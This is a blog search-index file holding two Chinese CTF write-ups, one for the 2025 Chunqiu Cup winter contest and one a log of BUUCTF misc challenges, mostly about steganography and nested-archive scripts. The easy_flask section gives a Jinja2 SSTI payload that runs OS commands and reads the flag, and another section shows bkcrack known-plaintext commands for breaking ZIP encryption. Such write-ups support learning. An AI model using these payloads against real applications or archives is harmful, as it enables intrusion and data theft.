<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2025春秋杯冬季赛</title>
    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
<p>听C3师傅说这还不算是上强度的</p>
<p>而且准备转型Web却只做出来一个签到属于是。。有点丢人了</p>
<p>还是要多练，下次努力不啃Misc老底</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单算术："><a href="#简单算术：" class="headerlink" title="简单算术："></a>简单算术：</h2><p>根据提示，想想异或，直接尝试Cyberchef一把梭</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
<h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>附件给了一个压缩包和一张阿兹特克码</p>
<p>解析得到</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
<p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
<p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
<p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p>
<h2 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h2><p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
<p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> re
zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
<span class="keyword">while</span> <span class="literal">True</span>:
    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
        ts1 = zipfile.ZipFile(zipname)
        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
    <span class="keyword">else</span>:
        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>

<p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> os
<span class="keyword">import</span> base64

<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password
<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
    <span class="keyword">try</span>:
        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
            zf.extractall(path=extract_to, pwd=password.encode())
            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
            <span class="keyword">return</span> zf.namelist()  
    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)
        <span class="keyword">return</span> []
<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
    current_number = start_number
    <span class="keyword">while</span> <span class="literal">True</span>:
        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        password = decode_password(password_filename)
        extracted_files = extract_zip(zip_filename, password,parent_dir)
        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
            <span class="keyword">break</span>
        next_zip_file = <span class="literal">None</span>
        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
                next_zip_file = extracted_file
                <span class="keyword">break</span>
        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
            <span class="keyword">break</span>
        current_number -= <span class="number">1</span>
<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    recursive_extract()</code></pre>

<p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
<p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p>
<p>根据我们第一个密码FG…..，显然不是文件头的格式，那么从0开始到99提取文件内容</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> base64


<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password

<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:
        current_number = start_number
        <span class="keyword">while</span> <span class="literal">True</span>:
            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
                <span class="keyword">break</span>
            decoded_password = decode_password(password_filename)
            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)
            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)
            current_number += <span class="number">1</span>


<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre>

<p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p>
<h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>首先看提示是不知道有什么用的</p>
<p>拿到一张png，用010查一下看到zip头</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p>
<p>foremost提取一下</p>
<p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p>
<p>同时注意到文件名有点可疑，留意一下，可能后续要用</p>
<p>脚本：</p>
<pre><code class="highlight plaintext">import os
import zipfile
import tarfile
import py7zr
import shutil


def extract_zip(zip_path, extract_dir):
    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;
    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:
        zip_ref.extractall(extract_dir)
        return zip_ref.namelist()  # 返回解压出来的文件列表


def extract_tar(tar_path, extract_dir):
    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;
    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:
        tar_ref.extractall(extract_dir)
        return tar_ref.getnames()  # 返回解压出来的文件列表


def extract_7z(archive_path, extract_dir):
    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;
    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:
        archive_ref.extractall(extract_dir)
        return archive_ref.getnames()  # 返回解压出来的文件列表


def handle_compressed_file(file_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;
    if file_path.endswith(&#x27;.zip&#x27;):
        extracted_files = extract_zip(file_path, extract_dir)
    elif file_path.endswith(&#x27;.tar&#x27;):
        extracted_files = extract_tar(file_path, extract_dir)
    elif file_path.endswith(&#x27;.7z&#x27;):
        extracted_files = extract_7z(file_path, extract_dir)
    else:
        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)
        return []

    # 记录去掉后缀并连接的文件名
    with open(output_txt, &#x27;a&#x27;) as output_file:
        for file_name in extracted_files:
            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀
            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)

    return extracted_files


def process_zip(zip_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;
    # 解压当前zip文件并返回解压后的文件列表
    extracted_files = extract_zip(zip_path, extract_dir)

    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue  # 跳过目录

        # 如果解压出来的是压缩包，再进行递归处理
        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            # 解压嵌套压缩包并处理
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            # 如果是嵌套的压缩包，再递归调用
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

        else:
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if zip_path.endswith(&#x27;.zip&#x27;):
        os.remove(zip_path)


def process_tar(tar_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;
    extracted_files = extract_tar(tar_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if tar_path.endswith(&#x27;.tar&#x27;):
        os.remove(tar_path)


def process_7z(archive_path, extract_dir, output_txt):
    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;
    extracted_files = extract_7z(archive_path, extract_dir)
    for extracted_file in extracted_files:
        extracted_file_path = os.path.join(extract_dir, extracted_file)

        if os.path.isdir(extracted_file_path):
            continue

        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):
            handle_compressed_file(extracted_file_path, extract_dir, output_txt)
            if extracted_file.endswith(&#x27;.zip&#x27;):
                process_zip(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.tar&#x27;):
                process_tar(extracted_file_path, extract_dir, output_txt)
            elif extracted_file.endswith(&#x27;.7z&#x27;):
                process_7z(extracted_file_path, extract_dir, output_txt)

    # 删除当前处理的压缩包
    if archive_path.endswith(&#x27;.7z&#x27;):
        os.remove(archive_path)


def main():
    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;
    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;
    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;

    if not os.path.exists(extract_dir):
        os.makedirs(extract_dir)

    # 开始处理压缩包
    with open(output_txt, &#x27;w&#x27;) as output_file:
        output_file.write(&quot;&quot;)
    process_zip(zip_path, extract_dir, output_txt)


if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>再对提出来的文件名做两种处理</p>
<pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):
    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        file_names = infile.readlines()

    # 去掉换行符并从后往前连接
    reversed_file_names = [name.strip() for name in reversed(file_names)]

    # 将连接后的文件名写入新文件
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)
        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名
def remove_newlines_and_connect(input_txt, output_txt):
    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;
    with open(input_txt, &#x27;r&#x27;) as infile:
        # 读取所有行并去掉换行符
        file_names = infile.read().splitlines()

    # 将文件名用空格连接
    connected_file_names = &quot;&quot;.join(file_names)

    # 将连接后的文件名写入新文件
    with open(output_txt, &#x27;w&#x27;) as outfile:
        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)
        outfile.write(connected_file_names)  # 直接写入连接后的字符串

def main():
    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;
    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;
    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;
    reverse_file_names(input_txt, output1_txt)
    remove_newlines_and_connect(input_txt, output2_txt)

if __name__ == &quot;__main__&quot;:
    main()</code></pre>

<p>根据提示BASE58-Ripple、SM4-ECB</p>
<p>先后尝试顺序的和逆序的</p>
<p>最后逆序的得到以下</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p>
<p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p>
<p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p>
<p>在谷歌搜图后判断出是 DataMatrix码</p>
<p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p>
<h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>解压得到一个wav文件</p>
<p>根据提示deepsound和弱口令</p>
<p>试一下123？</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p>
<p>运气比较好直接出来了</p>
<p>提取zip后发现需要密码打开</p>
<p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p>
<p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p>
<pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header
bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>

<p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p>
<pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre>

<p>得到flag.png</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p>
<p>左上角一看肯定有lsb稳了，zsteg一跑</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据提示想想flask,应该是SSTI漏洞</p>
<p>先试着打一下，看看有没有绕过</p>
<pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p>
<p>直接爆了，那就ls换cat flag解决</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>
]]></content>
      <tags>
        <tag>-CTF -misc -WP</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU—MISC刷题记录</title>
    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
<p>主要是HTTP流量，直接追踪流</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
<p>用<code>captfencoder</code>MD5一下结束战斗</p>
<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
<p>查完没有藏文件，那应该就是隐写了</p>
<p>结果没有发现隐写，感觉被骗了</p>
<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
<p>成功了，打开提取的文件发现有PK头</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
<p>foremost出一下，要密码，先尝试弱密码爆破</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
<p>看来是改了后缀，010先查查看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
<p>演都不演了…</p>
<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
<p>盯完帧没有东西，看看副本，发现已经损坏</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
<p>（这里-其实是_）</p>
<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
<blockquote>
<p>[!NOTE]</p>
<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
</blockquote>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
crc32 flag.jpg</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
<p>水平有限，还是手敲罢</p>
<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
<p>鉴定为图片纯纯的诈骗（恼</p>
